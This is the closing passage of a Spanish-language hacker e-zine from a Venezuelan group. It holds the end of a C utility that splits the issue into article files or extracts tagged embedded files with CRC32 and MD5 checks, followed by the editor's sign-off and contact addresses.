            fn_p = fn_p->next;
            strncpy(fn_p->name, fn, sizeof(fn_p->name));
            fn_p->next = NULL;
	  }
      }

    if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
      {
        perror("malloc");
        exit(1);
      }
    fn_p = fn_p->next;
    fn_p->next = NULL;

if(modo_split==1)
{
      for(fn_p = head; fn_p -> next;fn_p = fn_p->next)
      {
      	if(!(in_p=fopen(fn_p->name,"r")))
        {
          fprintf(stderr,"No se puede abrir el archivo original especificado: %s\n",fn_p->name);
          continue;
        }
        else
        { 
	  fprintf(stderr, "%s abierto.\n", fn_p->name);
        
        tmp=fn_p->name;

	separado=fopen("2x00.txt","w");
	fprintf(stderr,"Separando 2x00.txt\n");

        while(fgets(b,256,in_p))
        {
          if(!strncmp(b,SPLIT_TAG,SPLIT_SIZE))
          {
            b[strlen(b) -1 ]=0;

            if((bp=strchr(b + SPLIT_SIZE + 1,' ')))
            { 
              *bp=0;
	      if((separado=fopen(strncat(b + SPLIT_SIZE-2,".txt",4),"w"))==NULL)
              {
              	printf("No se puede crear %s\n",b);
                continue;
		}
              fprintf(stderr,"Separando %s\n",b +SPLIT_SIZE-2);
            }
	    *bp='.';
            fprintf(separado,"%s",b);
            fprintf(separado," ]----------------------------------------------------------------\n");
          }
          else
              fprintf(separado,"%s",b);
	}
      }
    }
}
else
{
    for (fn_p = head; fn_p->next; fn_p = fn_p->next)
    {
        if (!(in_p = fopen(fn_p->name, "r")))
        {
            fprintf(stderr, "No se puede abrir el archivo original %s.\n", fn_p->name);
            continue;
        }
        else fprintf(stderr, "%s abierto\n", fn_p->name);

        crcgen();

        while (fgets(b, 256, in_p))
        {
             if (!strncmp (b, BEGIN_TAG, BT_SIZE))
             {
                b[strlen(b) - 1] = 0;
                j++;

                /* crc=0;
                   crc_f=0;    X-DDD */

                if ((bp = strchr(b + BT_SIZE + 1, '/')))
                {
                    while (bp)
                    {
                        *bp = 0;
                        mkdir(b + BT_SIZE, 0700);
                        *bp = '/';
                        bp = strchr(bp + 1, '/');
                    }
                }


                if((bp=strchr(b,'!')))
                {
                   crc_f=strtoul((b + (strlen(b)-strlen(bp)) + 1),NULL,16);
                   b[strlen(b) - strlen(bp) - 1 ]=0;
                   h_c=1;
                   h_md5=0;
                }
                else
                {
                   h_c=0;
                   if((bp=strchr(b,'$')))
                   {
                        d2=0;
                        if(strlen(bp) < 33)
                           d2=1;
                        memcpy(&digest_f,bp+1,32);
			digest_f[32]='\0';
                        b[strlen(b) - strlen(bp) - 1] =0;
                        h_md5=1;
                   }
                   else
                   {
                      h_c=0;
                      h_md5=0;
                   }
                }

                if ((out_p = fopen(b + BT_SIZE, "wb+")))
                   printf("- Extrayendo %s\n ", b + BT_SIZE);
                else
                {
                    printf("No se puede extraer '%s'.\n", b + BT_SIZE);
                    continue;
                }

             }

             else if (!strncmp (b, END_TAG, ET_SIZE))
             {
                if (out_p)
                {
                    if(h_c==1)
                    {
                        fseek(out_p,0l,0);
                        crc=check_crc(out_p);

                        if(crc==crc_f)
                           printf("            crc32 = %08lx  ... comprobado\n ",crc);
                        else
                           printf("            crc32 -> %08lx - %08lx  no coincide!\n ",crc,crc_f);

                    }
                    if(h_md5==1)
                    {
                        mdfile(out_p,digest);
                        tmp_digest(digest,digest_tmp);

                        for(k=0;k<32;k++)
                        {
                           if(digest_f[k] != digest_tmp[k])
                              d1=1;
                        }
                        if(d1==0)
                           printf(" md5 : %s -- ok!\n",digest_f);
                        else
                        {
                           if(d2==0)
                                printf("  md5! %s  <-- md5 suministrado.\n",digest_f);
                           else
                                printf(" md5!  Codigo MD5 suministrado incompleto.\n");
                           printf("        %s  <-- md5 correcto.\n",digest_tmp);
			}   
                        d1=0;
                    }
                    /* nos vamos */
                    fclose(out_p);

                }
                else
                {
                    fprintf(stderr, "Error al cerrar el archivo %s.\n", fn_p->name);
                    continue;
                }
            }
            else if (out_p)
            {
                fputs(b, out_p);
            }
        }
    }
    if (!j) printf("No se han encontrado etiquetas de extraccion.\n");
    else printf("Extraidos %d archivo(s).\n", j);
    return (0);
}
}
[--]

 --EOF--



-[ 2x17 ]--------------------------------------------------------------------
-[ Esto es todo Amigos ... ]-----------------------------------[ El Editor ]-
---------------------------------------------------------[ kl0nk@0ri0n.org ]-


 Bueno Amigos, esta edicion dos (2)  ha culminado, esperamos que nos volvamos
 a ver dentro  de 4 meses (si Dios y el Diablo nos dejan).

 Si  tienen alguna sugerencia, pueden enviarla a staff@0ri0n.org  y  para la
 colabororaciones con nuestra revista, pueden hacerlo a: ezine@0ri0n.org

 Sin mas nada que decir ......


                                              Nos Vemos en la Proxima entrega




    ...................................................................
   .:. Derechos Reservados (c) By  0ri0n  Team Venezuela - 2000-2001 .:.
   .:..:..:..:..:..:..:..:..:..:..:.:...:..:..:..:..:..:..:..:..:..:..:.

